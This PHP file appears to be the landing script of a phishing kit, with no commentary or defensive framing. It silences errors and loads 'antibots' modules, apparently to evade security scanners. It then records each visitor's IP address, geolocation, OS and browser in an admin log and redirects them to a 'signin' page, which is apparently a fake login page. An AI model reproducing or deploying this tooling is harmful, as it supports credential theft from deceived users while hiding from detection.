<?php 
	@error_reporting(0);

	require 'antibots/Bo1.php';
	require 'antibots/Bo2.php';
	require 'antibots/Bo3.php';
	require 'antibots/Bo4.php';

	ob_start();
	session_start();
	require 'system/detector.php';

	$_SESSION['startAt'] 		= getDateNow();
	$_SESSION['ip'] 			= clientData('ip');
	$_SESSION['ip_countryName'] = clientData('country');
	$_SESSION['ip_countryCode'] = clientData('code');
	$_SESSION['ip_city'] 		= clientData('city');
	$_SESSION['ip_state'] 		= clientData('state');
	$_SESSION['ip_timezone'] 	= clientData('timezone');
	$_SESSION['os'] 			= getOs();
	$_SESSION['browser'] 		= getBrowser();

	$code = "{$_SESSION['ip']} | {$_SESSION['startAt']} | {$_SESSION['ip_countryName']} | {$_SESSION['os']} | {$_SESSION['browser']}\r\n";
	$save = fopen("../admin/views.txt","a+");
	fwrite($save,$code);
	fclose($save);
	
	header("Location: signin/?country={$_SESSION['ip_countryCode']}&local={$_SESSION['ip_city']};q=0.8");

?>